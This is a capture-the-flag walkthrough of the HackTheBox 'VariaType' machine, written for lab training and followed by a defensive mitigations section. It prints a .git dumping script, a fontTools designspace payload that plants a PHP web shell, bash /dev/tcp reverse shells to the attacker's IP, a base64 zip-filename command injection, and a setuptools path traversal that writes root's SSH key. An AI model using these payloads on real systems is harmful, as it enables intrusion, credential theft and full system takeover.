---
title: VariaType
os: Linux
difficulty: Medium
tags:
  - Git Disclosure
  - fontTools XML Injection
  - CVE-2025-66034
  - Cron Job Command Injection
  - setuptools Path Traversal
  - CVE-2025-47273
---

# 🛡️ HTB - VariaType (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** VariaType
- **Operating System:** Linux (Debian)
- **Difficulty:** Medium
- **Vulnerabilities:** Exposed Git Directory, CDATA XML Injection & Path Traversal in fontTools (CVE-2025-66034), Filename Command Injection in Cron Job, Sudo Privilege Escalation via setuptools PackageIndex Path Traversal (CVE-2025-47273)

---

## Step 1 - Reconnaissance

Will Use Nmap To See what Ports and Services are Open:

```bash
nmap -A -sS -Pn -T4  --min-rate 5000 10.129.9.136
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-17 04:31 UTC
Warning: 10.129.9.136 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.129.9.136
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://variatype.htb/
|_http-server-header: nginx/1.22.1

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/17%OT=22%CT=1%CU=43101%PV=Y%DS=2%DC=T%G=Y%TM=69B8
OS:D952%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=101%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=102%GCD=1%ISR=109%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=103%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FE
OS:%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=
OS:M552NNT11NW7%O4=M552ST11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE
OS:88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7
OS:%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=
OS:Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%
OS:RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIP
OS:CK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   238.03 ms 10.10.14.1
2   241.56 ms 10.129.9.136

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.42 seconds
```

- 🔍 *The nmap scan reports ports 22 (SSH) and 80 (HTTP) are open. Let's add variatype.htb to our `/etc/hosts`.*
- 🔍 *Navigating to the web portal reveals it is a font generation tool that accepts `.designspace` and OpenType (`.ttf`/`.otf`) files to output a variable master font.*

---

## Step 2 - Enumeration

- 🔍 *We perform virtual host enumeration to search for subdomains:*

```bash
gobuster vhost -u http://variatype.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 50
```

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://variatype.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.6
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: portal.variatype.htb Status: 200 [Size: 2494]
Progress: 4989 / 4990 (99.98%)
===============================================================
Finished
===============================================================
```

- 🔍 *The `portal.variatype.htb` subdomain hosts an "Internal Validation Portal" employee login page.*
- 🔍 *Next, we run dirsearch on the main domain:*

```bash
python3 dirsearch.py -u "http://variatype.htb/" -x 404
```

```text
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm
HTTP method: GET | Threads: 25
Wordlist size: 12294

Target: http://variatype.htb/

[04:36:19] Scanning:
[04:37:47] 302 -   247B - /download/users.csv  ->  /tools/variable-font-generator
[04:37:47] 302 -   247B - /download/history.csv  ->  /tools/variable-font-generator
[04:38:34] 200 -    3KB - /services

Task Completed
```

- 🔍 *No direct vulnerabilities were found on the primary directories. We scan `portal.variatype.htb` for directories:*

```bash
python3 dirsearch.py -u "http://portal.variatype.htb/" -x 404
```

```text
  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )
 
Extensions: php, asp, aspx, jsp, html, htm
HTTP method: GET | Threads: 25
Wordlist size: 12294

Target: http://portal.variatype.htb/

[14:38:16] Scanning:
[14:38:36] 301 -   169B - /.git  ->  http://portal.variatype.htb/.git/
[14:38:36] 403 -   555B - /.git/
[14:38:36] 200 -    73B - /.git/description
[14:38:36] 200 -    39B - /.git/COMMIT_EDITMSG
[14:38:36] 200 -   143B - /.git/config
[14:38:36] 200 -    23B - /.git/HEAD
[14:38:36] 403 -   555B - /.git/hooks/
[14:38:36] 200 -   137B - /.git/index
[14:38:36] 403 -   555B - /.git/info/
[14:38:36] 403 -   555B - /.git/branches/
[14:38:36] 200 -   240B - /.git/info/exclude
[14:38:36] 301 -   169B - /.git/logs/refs  ->  http://portal.variatype.htb/.git/logs/refs/
[14:38:36] 200 -   700B - /.git/logs/HEAD
[14:38:36] 403 -   555B - /.git/logs/
[14:38:36] 200 -   700B - /.git/logs/refs/heads/master
[14:38:36] 301 -   169B - /.git/logs/refs/heads  ->  http://portal.variatype.htb/.git/logs/refs/heads/
[14:38:36] 301 -   169B - /.git/refs/heads  ->  http://portal.variatype.htb/.git/refs/heads/
[14:38:36] 403 -   555B - /.git/objects/
[14:38:36] 200 -    41B - /.git/refs/heads/master
[14:38:36] 403 -   555B - /.git/refs/
[14:38:37] 301 -   169B - /.git/refs/tags  ->  http://portal.variatype.htb/.git/refs/tags/
[14:40:16] 200 -     0B - /auth.php
[14:40:42] 302 -     0B - /dashboard.php  ->  /
[14:40:46] 302 -     0B - /download.php  ->  /
[14:40:54] 301 -   169B - /files  ->  http://portal.variatype.htb/files/
[14:40:55] 403 -   555B - /files/
[14:41:02] 200 -    2KB - /index.php
```

- 🔍 *The `.git` directory is exposed. We create a Python script to download the Git repository structure recursively:*

```python
#!/usr/bin/env python3
import requests
import os
import sys
from urllib.parse import urljoin
import time
import logging

BASE_URL = "http://portal.variatype.htb"
OUTPUT_DIR = "portal_dump"
PROXY = None

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('download.log'),
        logging.StreamHandler()
    ]
)

PATHS = [
    ".git/description",
    ".git/COMMIT_EDITMSG",
    ".git/config",
    ".git/HEAD",
    ".git/index",
    ".git/info/exclude",
    ".git/logs/HEAD",
    ".git/logs/refs/heads/master",
    ".git/refs/heads/master",
    "auth.php",
    "dashboard.php",
    "download.php",
    "index.php",
    ".git/",
    ".git/hooks/",
    ".git/info/",
    ".git/branches/",
    ".git/logs/",
    ".git/logs/refs/",
    ".git/logs/refs/heads/",
    ".git/objects/",
    ".git/refs/",
    ".git/refs/heads/",
    ".git/refs/tags/",
    "files/",
]

class PortalDownloader:
    def __init__(self, base_url, output_dir, proxy=None):
        self.base_url = base_url
        self.output_dir = output_dir
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Connection': 'keep-alive',
        })
        self.stats = {'downloaded': 0, 'failed': 0, 'forbidden': 0, 'not_found': 0}

    def ensure_dir(self, filepath):
        directory = os.path.dirname(filepath)
        if directory and not os.path.exists(directory):
            os.makedirs(directory, exist_ok=True)

    def download_file(self, path):
        url = urljoin(self.base_url, path)
        output_path = os.path.join(self.output_dir, path)
        if path.endswith('/'):
            self.ensure_dir(output_path)
            return True
        self.ensure_dir(output_path)
        try:
            response = self.session.get(url, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                with open(output_path, 'wb') as f:
                    f.write(response.content)
                self.stats['downloaded'] += 1
                return True
            elif response.status_code == 403:
                self.stats['forbidden'] += 1
                return False
            elif response.status_code == 404:
                self.stats['not_found'] += 1
                return False
        except Exception as e:
            self.stats['failed'] += 1
            return False

    def download_all(self, paths, delay=0.1):
        for path in paths:
            self.download_file(path)
            time.sleep(delay)

    def extract_git_objects(self):
        # Extract logs and HEAD to discover other commit hashes
        log_path = os.path.join(self.output_dir, ".git/logs/HEAD")
        if os.path.exists(log_path):
            with open(log_path, 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 2:
                        for hash_val in parts[:2]:
                            if len(hash_val) == 40:
                                obj_dir = hash_val[:2]
                                obj_file = hash_val[2:]
                                self.download_file(f".git/objects/{obj_dir}/{obj_file}")

downloader = PortalDownloader(BASE_URL, OUTPUT_DIR, PROXY)
downloader.download_all(PATHS)
downloader.extract_git_objects()
```

- 🔍 *Reviewing the downloaded `.git/config` reveals user information:*

```ini
[user]
       name = Dev Team
       email = dev@variatype.htb
```

- 🔍 *We check the repository history using git log:*

```bash
git log --oneline
```

```text
753b5f5 (HEAD -> master) fix: add gitbot user for automated validation pipeline
5030e79 feat: initial portal implementation
```

- 🔍 *We write a quick decompression script to search for the credentials inside the Git objects:*

```python
import zlib
import os

for root, dirs, files in os.walk(".git/objects"):
    for file in files:
        filepath = os.path.join(root, file)
        try:
            with open(filepath, 'rb') as f:
                data = zlib.decompress(f.read())
                if b'gitbot' in data:
                    print(f"Found in: {filepath}")
                    print(data.decode('utf-8', errors='ignore'))
        except:
            pass
```

- 🔍 *We find the commit object `753b5f5957f2020480a19bf29a0ebc80267a4a3d` details:*

```text
commit 259tree c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4
parent 5030e791b764cb2a50fcb3e2279fea9737444870
author Dev Team <dev@variatype.htb> 1764968373 -0500
committer Dev Team <dev@variatype.htb> 1764968373 -0500

fix: add gitbot user for automated validation pipeline
```

- 🔍 *The commit tree points to `c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4`. We download and parse it:*

```bash
curl -s http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 -o c6_tree
```

- 🔍 *Parsing the tree object `c6ea13ef05d96cf3f35f62f87df24ade29d1d6b4` reveals `auth.php` mapped to blob `b328305f0e85c2b97a7e2a94978ae20f16db75e8`:*

```text
File: auth.php
  Mode: 100644
  SHA1: b328305f0e85c2b97a7e2a94978ae20f16db75e8
```

- 🔍 *We retrieve and decompress this blob:*

```bash
curl -s http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 -o b3_blob
python3 -c "import zlib; print(zlib.decompress(open('b3_blob', 'rb').read()).decode())"
```

```php
<?php
session_start();
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

- 🔍 *We successfully recover the credentials `gitbot` : `G1tB0t_Acc3ss_2025!`. Logging in to the portal confirms it is a static dashboard with no directly exploitable input.*

---

## Step 3 - Initial Foothold

- 🔍 *We analyze the font generation tool on `variatype.htb`. Research into `fontTools` processing of XML-based `.designspace` and OpenType files reveals a critical Path Traversal and CDATA XML Injection flaw (CVE-2025-66034).*
- 🔍 *The vulnerability occurs because the filename attribute in the `<variable-font>` element does not sanitize directory traversal symbols, and the `<labelname>` element evaluates CDATA tags directly. We build a script to generate two basic TTF master font files:*

```python
#!/usr/bin/env python3
import os
from fontTools.fontBuilder import FontBuilder
from fontTools.pens.ttGlyphPen import TTGlyphPen

def create_source_font(filename, weight=400):
    fb = FontBuilder(unitsPerEm=1000, isTTF=True)
    fb.setupGlyphOrder([".notdef"])
    fb.setupCharacterMap({})
    pen = TTGlyphPen(None)
    pen.moveTo((0, 0))
    pen.lineTo((500, 0))
    pen.lineTo((500, 500))
    pen.lineTo((0, 500))
    pen.closePath()
    fb.setupGlyf({".notdef": pen.glyph()})
    fb.setupHorizontalMetrics({".notdef": (500, 0)})
    fb.setupHorizontalHeader(ascent=800, descent=-200)
    fb.setupOS2(usWeightClass=weight)
    fb.setupPost()
    fb.setupNameTable({"familyName": "Test", "styleName": f"Weight{weight}"})
    fb.save(filename)

create_source_font("source-light.ttf", weight=100)
create_source_font("source-regular.ttf", weight=400)
```

- 🔍 *We construct the malicious `.designspace` configuration targeting the webroot path `/var/www/portal.variatype.htb/public/files/shell.php`:*

```xml
<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
    <axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
            <labelname xml:lang="en"><![CDATA[<?php system($_GET['cmd']); ?>]]></labelname>
        </axis>
    </axes>
    <sources>
        <source filename="source-light.ttf" name="Light">
            <location>
                <dimension name="Weight" xvalue="100"/>
            </location>
        </source>
        <source filename="source-regular.ttf" name="Regular">
            <location>
                <dimension name="Weight" xvalue="400"/>
            </location>
        </source>
    </sources>
    <variable-fonts>
        <variable-font name="MaliciousFont" filename="../../../../../../../var/www/portal.variatype.htb/public/files/shell.php">
            <axis-subsets>
                <axis-subset name="Weight"/>
            </axis-subsets>
        </variable-font>
    </variable-fonts>
</designspace>
```

- 🔍 *We upload the files using a multipart request via curl:*

```bash
curl -v -X POST http://variatype.htb/tools/variable-font-generator/process \
  -F "designspace=@malicious.designspace" \
  -F "masters=@source-light.ttf" \
  -F "masters=@source-regular.ttf" \
  -H "Expect:"
```

- 🔍 *We confirm command execution is working:*

```bash
curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

- 🔍 *We set up a netcat listener and request a reverse shell:*

```bash
curl -sG --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.67/4444 0>&1'" "http://portal.variatype.htb/files/shell.php"
```

```text
www-data@variatype:~/portal.variatype.htb/public/files$
```

---

## Step 4 - Privilege Escalation

- 🔍 *We search for background tasks or scheduled scripts running with active process monitors:*
- 🔍 *A background cron job runs `/home/steve/bin/process_client_submissions.sh` regularly as the user `steve`.*
- 🔍 *The script unzips user submissions using a wildcard character `*` in the extraction command. This exposes a filename command injection vulnerability.*
- 🔍 *We build a script to package a base64 encoded reverse shell into a malicious zip file name:*

```python
#!/usr/bin/env python3
import zipfile
import base64

rev_shell = "bash -i >& /dev/tcp/10.10.14.67/4445 0>&1"
payload = base64.b64encode(rev_shell.encode()).decode()
exploit_filename = f'$(echo {payload}|base64 -d|bash).ttf'

with zipfile.ZipFile('exploit.zip', 'w') as zipf:
    zipf.writestr(exploit_filename, "Trigger reverse shell")
```

- 🔍 *We download the exploit zip file onto the target:*

```bash
curl http://10.10.14.67:8000/exploit.zip -o /var/www/portal.variatype.htb/public/files/exploit.zip
```

- 🔍 *We catch the incoming shell on port 4445 to log in as `steve`:*

```text
connect to [10.10.14.67] from (UNKNOWN) [10.129.9.74] 34090
steve@variatype:~$ cat user.txt
3accbc651e835f...
```

- 🔍 *We check the allowed sudo commands for user `steve`:*

```bash
steve@variatype:~$ sudo -l
```

```text
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

- 🔍 *The script `/opt/font-tools/install_validator.py` allows downloading packages using `setuptools.package_index.PackageIndex`.*
- 🔍 *This library version suffers from a Path Traversal vulnerability (CVE-2025-47273) in `setuptools.package_index.PackageIndex.download()`, where directory traversal sequences in the requested URL segment can write files arbitrary locations on the file system.*
- 🔍 *We generate a temporary SSH key pair:*

```bash
ssh-keygen -t ed25519 -f /tmp/rootkey -N ""
mkdir -p /tmp/serve
cp /tmp/rootkey.pub /tmp/serve/authorized_keys
```

- 🔍 *We host a minimal Python HTTP server serving the public key file as `authorized_keys`:*

```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        with open('/tmp/serve/authorized_keys', 'rb') as f:
            data = f.read()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Length', len(data))
        self.end_headers()
        self.wfile.write(data)

HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
```

- 🔍 *We execute the sudo script targeting the URL-encoded path to root's SSH authorized_keys file:*

```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py \
  "http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys"
```

```text
2026-03-20 02:11:33,769 [INFO] Attempting to install plugin from: http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-20 02:11:33,777 [INFO] Downloading http://10.10.14.67:8888/%2Froot%2F.ssh%2Fauthorized_keys
2026-03-20 02:11:36,463 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

- 🔍 *We log in via SSH using the private key to get a root shell:*

```bash
ssh -i /tmp/rootkey root@10.129.9.74
```

```text
root@variatype:~# cat /root/root.txt
3accbc651e835f15360e76cd75c6f567
```

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and structural misconfiguration exploited in the VariaType system. Each vulnerability is mapped to its core risk, threat impact, and practical defensive remediation strategies.

### 🔴 Exposed Git Directory and Credential Exposure
> [!WARNING]
> **Vulnerability Profile:**
> The web service exposed its version control directory (`.git`) to public access. An attacker recovered the commit history and parsed historical compressed repository blobs (`b328305f0e85c2b97a7e2a94978ae20f16db75e8`), retrieving automated pipeline credentials (`gitbot` : `G1tB0t_Acc3ss_2025!`) from the version-controlled `auth.php` script.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Public Git folders expose source code, configuration details, database schemas, and hardcoded authentication secrets. Leakage of automated service credentials gives attackers potential persistent access to APIs, portals, and system integration points.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Configure Nginx and other web servers to explicitly deny access to hidden files (`.git/`, `.env`, etc.) by returning a `403 Forbidden` status. Implement automated scans (using tools like Trufflehog or GitGuardian) in CI/CD pipelines to prevent secrets from being committed.
> - **Detection:** Set up log alerts for requests attempting to access files starting with `/.git/` and monitor unauthorized access attempts on static authentication pages.

### 🔴 XML CDATA Injection & Path Traversal in fontTools (CVE-2025-66034)
> [!WARNING]
> **Vulnerability Profile:**
> The application compiled font designs using a vulnerable version of `fontTools.varLib`. The XML-based `.designspace` file configuration failed to sanitize path values inside the `<variable-font>` element's `filename` attribute, while evaluating inline CDATA block vectors inside `<labelname>` tags. This allowed writing a PHP shell to the web-accessible directory.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Path traversal inside file compilation structures lets attackers bypass upload directory isolation. Combined with XML injection, attackers can write arbitrary code contents, leading to Remote Code Execution (RCE) as the web daemon user.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade `fontTools` to version 4.60.2 or higher. Ensure all user-supplied files are compiled inside sandboxed directories, and sanitize path values to remove traversal strings (`../`).
> - **Detection:** Monitor HTTP file upload points for files containing XML schema declarations (`<?xml`), CDATA wrapper tags (`<![CDATA[`), or PHP executable symbols (`<?php`).

### 🔴 Wildcard Extraction Filename Command Injection
> [!WARNING]
> **Vulnerability Profile:**
> The background cron job executing `/home/steve/bin/process_client_submissions.sh` extracted incoming client archive files using a wildcard extraction command. This command parsed filenames literally, causing the shell to execute command segments embedded directly inside a file name (e.g. `$(echo payload | base64 -d | bash).ttf`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Command injection in background automated scripts allows a lower-privileged user to immediately hijack user contexts running scheduled jobs.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Avoid invoking external shell commands for file actions. Use internal programming APIs (e.g., Python's built-in `zipfile` module) to process archives, and strip special shell characters (such as `$`, `(`, `)`, `;`, `&`) from filenames before processing.
> - **Detection:** Track execution monitors (e.g., Audited, Sysmon) for parent shells (like `unzip`) spawning child shell processes (such as `bash` or `sh`) from non-interactive system users.

### 🔴 Path Traversal in setuptools PackageIndex (CVE-2025-47273)
> [!WARNING]
> **Vulnerability Profile:**
> The sudo configuration allowed user `steve` to execute `/opt/font-tools/install_validator.py` as root without a password. The script used a vulnerable version of `setuptools.package_index.PackageIndex` to download package resources. The library failed to validate url-encoded paths, allowing file-writes to arbitrary target paths via traversal parameters (e.g., writing the public key to `/root/.ssh/authorized_keys`).

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Insecure sudo permissions combined with library path traversal allows complete system takeover and local privilege escalation to root.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Update `setuptools` to a secure version. Restrict wildcard parameters in `sudoers` definitions, and ensure internal validator scripts enforce hardcoded paths and validate input strings before passing them to the package installer.
> - **Detection:** Log and alert on all executions of `sudo` calling Python installer scripts with external URL arguments. Monitor changes to `/root/.ssh/authorized_keys`.
